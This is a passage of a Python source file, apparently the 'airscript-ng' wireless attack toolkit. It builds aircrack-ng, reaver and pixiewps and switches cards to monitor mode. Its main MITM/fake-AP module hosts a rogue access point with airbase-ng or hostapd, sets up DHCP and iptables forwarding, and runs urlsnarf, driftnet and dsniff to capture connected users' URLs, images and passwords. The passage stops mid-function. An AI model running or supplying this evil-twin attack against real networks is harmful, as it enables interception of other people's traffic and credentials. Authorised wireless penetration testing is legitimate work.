#!/usr/bin/env python3
class col:
    head = '\033[0m'
    okb = '\033[0m'
    okg = '\033[0m'
    warn = '\033[0m'
    fail = '\033[0m'
    endl = '\033[0m'
    bold = '\033[0m'
    uline = '\033[0m'
    blue_deep = '\033[0m'
    warn_deep = '\033[0m'
    fail_deep = '\033[0m'
    green_deep = '\033[0m'
    endl_deep = '\033[0m'
    yel_deep = '\033[0m'
def update_this_script():
    check_depends()
    import subprocess,os
    while True:
        up_choc = input("\n%sUpdate this script? Any local changes will be lost! y/n > " %(col.endl))
        if up_choc.lower().startswith("y"):
            status_code_update = subprocess.call("git stash && git pull",shell=True)
            print("Update is done. Relaunch!")
            if status_code_update != 0:
                while True:
                    fix_git_config_rand = input("See something to do with %sgit-config%s? Fix that? %sy%s/%sn%s> " %(col.blue_deep,col.endl,col.okg,col.endl,col.warn,col.endl))
                    if fix_git_config_rand.lower().startswith("y"):
                        find_out = subprocess.check_output
                        user_git_name = find_out("id -u -n",shell=True).decode("utf-8").rstrip()
                        user_git_hostname = find_out("uname -n",shell=True).decode("utf-8").rstrip()
                        subprocess.call("git config user.email \"%s@%s.com\" "  %(user_git_name,user_git_hostname),shell=True)
                        subprocess.call("git config user.name \"%s\" " %(user_git_name),shell=True)
                        print("Applied fix, pulling update...")
                        subprocess.call("git stash && git pull",shell=True)
                        break
                    elif fix_git_config_rand.lower().startswith("n"):
                        break
            os._exit(1)
        elif up_choc.lower().startswith("n"):
            title()
def get_wifi_cards_pick():
    import subprocess
    iostream = subprocess.check_output
    wireless_cards = []
    index_array = []
    def_range = iostream("ls /sys/class/net/ | grep ^wl | wc -l",shell=True).decode("utf-8").rstrip()
    for i in range(1,int(def_range)+1):
        wireless_cards.append(iostream("ls /sys/class/net/ | grep ^wl | head -n %s | tail -n 1" %(i),shell=True).decode("utf-8").rstrip())
        index_array.append(i)
        print("%sTo choose %s%s%s %senter %s[%s]%s" %(col.fail_deep,col.blue_deep,wireless_cards[i-1],col.endl,col.fail_deep,col.warn_deep,i,col.endl))
    print("\n")
    def get_card_name():
        global index
        index = ""
        index = input("[?] What card shall I put in monitor-mode/use? (enter no.) >> ")
        if index in [str(i) for i in index_array]:
            index = wireless_cards[int(index)-1]
            if input("Use %s? y/n > " %(index)).lower().startswith("y"):
                subprocess.call("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index),shell=True)
                return index
            else:
                title()
        else:
            get_card_name()
    get_card_name()
def get_wifi_cards_pick_alt(choice):
    import subprocess
    iostream = subprocess.check_output
    wireless_cards = []
    index_array_alt = []
    if choice == "1":
        def_range = iostream("ls /sys/class/net/ | grep ^wl | wc -l",shell=True).decode("utf-8").rstrip()
    elif choice == "2":
        def_range = iostream("ls /sys/class/net/ | grep -v \"lo\" | grep -v \"%s\" | wc -l" %(index_alt),shell=True).decode("utf-8").rstrip()
    for i in range(1,int(def_range)+1):
        if choice == "1":
            wireless_cards.append(iostream("ls /sys/class/net/ | grep ^wl | head -n %s | tail -n 1" %(i),shell=True).decode("utf-8").rstrip())
        elif choice == "2":
            wireless_cards.append(iostream("ls /sys/class/net/ | grep -v \"lo\" | grep -v \"%s\" | head -n %s | tail -n 1" %(index_alt,i),shell=True).decode("utf-8").rstrip())
        index_array_alt.append(i)
        print("%sTo choose %s%s%s %senter %s[%s]%s" %(col.fail_deep,col.blue_deep,wireless_cards[i-1],col.endl,col.fail_deep,col.warn_deep,i,col.endl))
    print("\n")
    def get_card_name_alt():
        global index_alt
        dialog_array = ["[+]Ok, Now which interface shall I host the AP on?  ~#  ","[+]Which interface is connected to the internet?  ~#  "]
        index_alt = ""
        if choice == "1":
            index_alt = input("%s" %(dialog_array[0]))
        elif choice == "2":
            index_alt = input("%s" %(dialog_array[1]))
        if index_alt in [str(i) for i in index_array_alt]:
            index_alt = wireless_cards[int(index_alt)-1]
            return index_alt
        else:
            return get_card_name_alt()
    return get_card_name_alt()
def gitdeps():
    import subprocess
    call = subprocess.call
    if call("ls ~/.airscriptNG/air 2>/dev/null >/dev/null",shell=True) != 0:
        if call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
            call("mkdir -p ~/.airscriptNG/air && cd ~/.airscriptNG/air && apt update && apt install git git-core libnl-3-dev openssl libnl*-gen* libgcrypt20-dev build-essential libssl-dev -y && git clone git://git.kali.org/packages/aircrack-ng.git -b upstream && cd * && make",shell=True)
        else:
            print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
            os._exit(1)
    if call("ls ~/.airscriptNG/wps 2>/dev/null >/dev/null",shell=True) != 0:
        if call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
            call("mkdir -p ~/.airscriptNG/wps && cd ~/.airscriptNG/wps && apt update && apt install libpcap-dev build-essential -y && git clone git://git.kali.org/packages/reaver.git -b upstream && cd */src && ./configure && make",shell=True)
        else:
            print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
            os._exit(1)
    if call("ls ~/.airscriptNG/magic 2>/dev/null >/dev/null",shell=True) != 0:
        if call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
            call("mkdir -p ~/.airscriptNG/magic && cd ~/.airscriptNG/magic && apt update && apt install libssl-dev build-essential -y && git clone git://git.kali.org/packages/pixiewps.git -b upstream && cd */src/ && make && make install",shell=True)
        else:
            print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
            os._exit(1)
def mitm_fakeap_func():#FIX THIS
    try:
        import os, time, subprocess
        if os.system("ls -l /var/lib/dhcp/dhcpd.leases 2>/dev/null >/dev/null") != 0:
            os.system("touch /var/lib/dhcp/dhcpd.leases")
        global ch2
        global ch3
        global ch4
        global counter
        count = 0
        ch2 = ""
        ch3 = ""
        ch4 = ""
        selected_array = ["[SELECTED]","[UNSELECTED]","\n[REQUIRED]"]
        slr = selected_array
        options_avail_array = ["Host-ap with airbase-ng/hostapd","Intercept HTTP links and URLs - Type [2]","Intercept any images - Type [3]","Intercept any unencrypted passwords (not currently working) - Type [4]"]
        optn = options_avail_array
        os.system("clear")
        print("""

    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
    
    """)
        print("Welcome to the MITM/FAKE-AP screen")
        print("Please note that to host a fake AP and MITM internet traffic, you'll need two network interfaces")
        print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
        print("\n-----------------------------------------OPTIONS-----------------------------------------")
        print("%s- %s" %(slr[2],optn[0]))
        print("%s- %s" %(slr[1],optn[1]))
        print("%s- %s" %(slr[1],optn[2]))
        print("%s- %s" %(slr[1],optn[3]))
        print("\n-----------------------------------------OPTIONS-----------------------------------------")
        def help1():
            print("[SELECTED]- Intercept HTTP links and URLs")
        def help2():
            print("[SELECTED]- Intercept any images")
        def help3():
            print("[SELECTED]- Intercept any unencrypted passwords (not currently working) ")
            print("\n-----------------------------------------OPTIONS-----------------------------------------")
        def helpe1():
            print("[UNSELECTED]- Intercept HTTP links and URLs - Type [2]")
        def helpe2():
            print("[UNSELECTED]- Intercept any images - Type [3]")
        def helpe3():
            print("[UNSELECTED]- Intercept any unencrypted passwords (not currently working) - Type [4]")
            print("\n-----------------------------------------OPTIONS-----------------------------------------")
        #help1()
        #help2()
        #help3()
        def idkwhat():
            os.system("clear")
            print("""

    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
    
            """)
            print("Welcome to the MITM/FAKE-AP screen")
            print("Please note that to host a fake AP and MITM internet traffic, you'll need two network interfaces")
            print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
            print("\n-----------------------------------------OPTIONS-----------------------------------------")
            #print("\n[REQUIRED]- Host-ap with airbase-ng (hostapd support comming soon!)")
            print("%s- %s" %(slr[2],optn[0]))
        while True:
            if count < 2:
                choc = input("\nPlease choose two options, by entering the number. ~# ")
                if choc != "" and choc.isnumeric() == True and choc in ["2","3","4"]:
                    if choc == "2":
                        ch2 = "X"
                        count += 1
                    if choc == "3":
                        ch3 = "X"
                        count += 1
                    if choc == "4":
                        ch4 = "X"
                        count += 1
                    idkwhat()
                    if ch2 != "":
                        help1()
                    if ch2 == "":
                        helpe1()
                    if ch3 != "":
                        help2()
                    if ch3 == "":
                        helpe2()    
                    if ch4 != "":
                        help3()
                    if ch4 == "":
                        helpe3()
                    continue
                else:
                    os.system("clear")
                    idkwhat()
                    if ch2 != "":
                        help1()
                    if ch2 == "":
                        helpe1()
                    if ch3 != "":
                        help2()
                    if ch3 == "":
                        helpe2()    
                    if ch4 != "":
                        help3()
                    if ch4 == "":
                        helpe3()
                    continue
            else:
                break
        crucial = input("\n\nOptions correctly chosen [y/n]? ~# ")
        if crucial.lower().startswith("y"):
            os.system("clear")
            print("\n")
            airbase = get_wifi_cards_pick_alt("1")
            os.system("clear")
            print("\n")
            inetface = get_wifi_cards_pick_alt("2")
            global ap_host_method
            ap_options_array = [["h","Hostapd"],["a","AIRBASE-NG"]]
            ap_host_method = ""
            print("\n%sIf unsure, choose [h]. Not working? choose [c]. %s\n" %(col.endl_deep,col.endl))
            def get_ap_way():
                ap_host_method = input("[+]What shall I use to host the AP? [%sh%s]ostapd or [%sa%s]irbase-ng?  ~#   " %(col.green_deep,col.endl_deep,col.green_deep,col.endl_deep))
                for i,q in ap_options_array:
                    if ap_host_method.lower() == i:
                        ap_host_method = q
                        return ap_host_method
                return get_ap_way()
            ap_host_method = get_ap_way()
            global ssid
            ssid = input("[?]What shall I call the AP? (SSID)  ~#  ")
            ssid = str(ssid)
            global channelno
            channelno = input("[?]What channel shall I use?  ~#  ")
            channelno = str(channelno)
            global subnet
            subnet = input("[?]Use default subnet of '192.168.1.x' [y/n]?  ~#  ")
            subnet = str(subnet)
            global subnet2
            global subnet3
            subnet2 = "1"
            subnet3 = "0"
            if subnet.lower().startswith("n"):
                subnet2 = input("[?]Please enter the third digit of the subnet  ~#  ")
                subnet3 = input("[?]Please enter the fourth digit of the subnet  ~#  ")
                subnet2 = str(subnet2)
                subnet3 = str(subnet3)
            else:
                pass
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'default-lease-time 600;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'max-lease-time 7200;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'subnet 192.168.1.0 netmask 255.255.255.0{' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo 'subnet 192.168.1.0 netmask 255.255.255.0{' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option subnet-mask 255.255.255.0;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option broadcast-address 192.168.1.255;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option broadcast-address 192.168.1.255;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option domain-name-servers 8.8.8.8;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option routers 192.168.1.1;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    option routers 192.168.1.1;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    range 192.168.1.2 192.168.1.100;' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '    range 192.168.1.2 192.168.1.100;' >> /etc/dhcp/dhcpd.conf")
            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '}' >/dev/null 2>/dev/null") != 0:
            #    os.system("echo '}' >> /etc/dhcp/dhcpd.conf")
            if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") != 0:
                os.system("echo '#BY AIRSCRIPT-NG' >> /etc/dhcp/dhcpd.conf")
                os.system("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
                os.system("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
                os.system("echo 'subnet 192.168.%s.%s netmask 255.255.255.0{' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet3))
                os.system("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
                os.system("echo '    option broadcast-address 192.168.%s.255;' >> /etc/dhcp/dhcpd.conf" %(subnet2))
                os.system("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
                global routeloop
                routeloop = int(subnet3)
                routeloop = routeloop + 1
                os.system("echo '    option routers 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,routeloop))
                global subnet4 
                global subnet5
                global subnet6
                subnet4 = int(subnet3)
                subnet5 = subnet4 + 2
                subnet6 = subnet4 + 100
                subnet5 = str(subnet5)
                subnet6 = str(subnet6)
                os.system("echo '    range 192.168.%s.%s 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet5,subnet2,subnet6))
                os.system("echo '}' >> /etc/dhcp/dhcpd.conf")
            os.system("clear")
            print("""

    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
    
            """)
            print("\n-----------------------------------------OPTIONS-----------------------------------------")
            #print("\n[REQUIRED]- Host-ap with airbase-ng (hostapd support comming soon!)")
            print("%s- %s" %(slr[2],optn[0]))
            if ch2 != "":
                help1()
            if ch3 != "":
                help2()    
            if ch4 != "":
                help3()
            print("\n[INFO]- AP HOSTING METHOD: %s" %(ap_host_method))
            print("[INFO]- SSID: %s" %(ssid))
            print("[INFO]- CHANNEL: %s" %(channelno))
            print("[INFO]- AP INTERFACE: %s" %(airbase))
            print("[INFO]- INTERNET INTERFACE: %s" %(inetface))
            print("[INFO]- SUBNET: 192.168.%s.x" %(subnet2))
            #Put details of AP, card, etc..
            print("\n-----------------------------------------OPTIONS-----------------------------------------")
            randchoice = input("\n\nStart AP [y/n]? ~# ")
            #Finish this
            if randchoice.lower().startswith("y"):
                #START HERE
                #c2 = urlsnarf 
                #c3 = driftnet
                #c4 = dsniff
                #Common os.system stuff here
                if ap_host_method == "AIRBASE-NG":
                    def c2c3():
                        os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
                        if os.system("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
                            os.system("echo 'ip link set %s down ; iw dev %s set type monitor ; ip link set %s up'  >> ~/.airscriptNG/traffic-sniff.sh " %(airbase,airbase,airbase))
                            os.system("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'ifconfig at0 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(subnet2,routeloop))
                            os.system("echo 'dhcpd at0' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
                            os.system("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
                    c2c3()
                    if ch2 != "" and ch3 != "":
                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' " %(ssid,channelno,airbase))
                    if ch2 != "" and ch4 != "":
                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
                    if ch3 != "" and ch4 != "":
                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
                #END HERE
                #START THE NEXT ONE HERE
                elif ap_host_method == "Hostapd":
                    def c3c4():
                        os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
                        if os.system("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
                            os.system("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'ifconfig %s 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase,subnet2,routeloop))
                            os.system("echo 'dhcpd %s' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase))
                            os.system("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                            os.system("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
                            os.system("echo 'iptables --append FORWARD -j ACCEPT --in-interface %s' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase))
                            os.system("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
                    c3c4()
                    check_for_hostapd = subprocess.call("ls ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
                    if check_for_hostapd == 0:
                        subprocess.call("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
                    subprocess.call("touch ~/.airscriptNG/hostapd.conf",shell=True)
                    subprocess.call("echo 'interface=%s' >> ~/.airscriptNG/hostapd.conf" %(airbase),shell=True)
                    subprocess.call("echo 'driver=nl80211' >> ~/.airscriptNG/hostapd.conf",shell=True)
                    subprocess.call("echo 'ssid=%s' >> ~/.airscriptNG/hostapd.conf" %(ssid),shell=True)
                    subprocess.call("echo 'channel=%s' >> ~/.airscriptNG/hostapd.conf" %(channelno),shell=True)
                    subprocess.call("killall hostapd 2>/dev/null",shell=True)
                    subprocess.call("nmcli dev set %s managed no" %(airbase),shell=True)
                    if ch2 != "" and ch3 != "":
                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' " %(airbase,airbase,airbase))
                    if ch2 != "" and ch4 != "":
                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
                    if ch3 != "" and ch4 != "":
                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
                #END HERE FOR HOSTAPD
                import atexit
                def exynos():
                    import os
                    if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") == 0:
                        os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                        os.system("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
                        os.system("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
                        os.system("iptables --flush")
                        os.system("iptables --table nat --flush")
                        os.system("iptables --delete-chain")
                        os.system("iptables --table nat --delete-chain")
                        os.system("service isc-dhcp-server stop")
                        os.system("rm /var/run/dhcpd.pid 2>/dev/null")
                        subprocess.call("killall hostapd 2>/dev/null",shell=True)
                        subprocess.call("nmcli dev set %s managed yes" %(airbase),shell=True)
                        os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
                        subprocess.call("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
                        os.system("clear")
                atexit.register(exynos)
            elif randchoice.lower().startswith("n"):
                title()
        elif crucial.lower().startswith("n"):
            title()
        elif crucial != "y" or crucial != "n":
            title()
        #print("You can select any 3 for now (No.1 is required). Selected options will appear in the box -> |-[%s]-[%s]-[%s]-|" %(ch1,ch2,ch3))
    #WILL HOST THE CODE TO CREATE FAKE AP, RETRACE STEPS AND CONDUCT TMUX IN XTERM WITH DIFFERENT POSITIONS.
    #xterm -geometry 125x35+4320 -bg '#FFFFFF' -fg '#000000' THIS MAKES IT APPEAR TOP RIGHT
    #xterm -geometry 125x35+4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM RIGHT
    #xterm -geometry 125x35-4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM LEFT
    #xterm -geometry 125x35-7640 -bg '#FFFFFF' -fg '#000000' TOP LEFT try 87x25
    #ENCLOSE THIS IN A TRY/EXCEPT LOOP
    #os.system("echo -n \" // Chipset: \"; echo $(airmon-ng | awk -F ' ' {'print $4,$5,$6,$7'} | grep -v Chipset) ")
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        import os
        if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") == 0:
            os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null")
            os.system("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
            os.system("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
            os.system("iptables --flush")
            os.system("iptables --table nat --flush")
            os.system("iptables --delete-chain")
            os.system("iptables --table nat --delete-chain")
            os.system("service isc-dhcp-server stop")
            os.system("rm /var/run/dhcpd.pid 2>/dev/null")
            subprocess.call("killall hostapd 2>/dev/null",shell=True)
            subprocess.call("nmcli dev set %s managed yes" %(airbase),shell=True)
            os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
            subprocess.call("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
            os.system("clear")
            #os.system("tac /etc/dhcp/dhcpd.conf | sed '1,10 d' | tac >> /etc/dhcp/dhcpd.conf") REALLY REALLY BROKEN!
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '#BY AIRSCRIPT-NG')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'default-lease-time 600;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'max-lease-time 7200;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'subnet 192.168.%s.%s netmask 255.255.255.0{')\" > /etc/dhcp/dhcpd.conf" %(subnet2,subnet3))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option subnet-mask 255.255.255.0;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option broadcast-address 192.168.%s.255;')\" > /etc/dhcp/dhcpd.conf" %(subnet2))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option domain-name-servers 8.8.8.8;')\" > /etc/dhcp/dhcpd.conf")
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option routers 192.168.%s.%s;')\" > /etc/dhcp/dhcpd.conf" %(subnet2,routeloop))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    range 192.168.%s.%s 192.168.%s.%s;')\" > /etc/dhcp/dhcpd.conf" %(subnet2,subnet5,subnet2,subnet6))
            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '}')\" > /etc/dhcp/dhcpd.conf")
        else:
            os.system("clear")
        #import traceback,sys#remove this
        #print(traceback.format_exc())#remove this
        #print(sys.exc_info()[0])#remove
        #print(error_no)#remove
        os._exit(1)
def handshake_func():
    #Start here
    try:
        import os
        print("[-] Checking for dependancies")
        check_depends()
        while True:
            os.system("clear")
            print("""

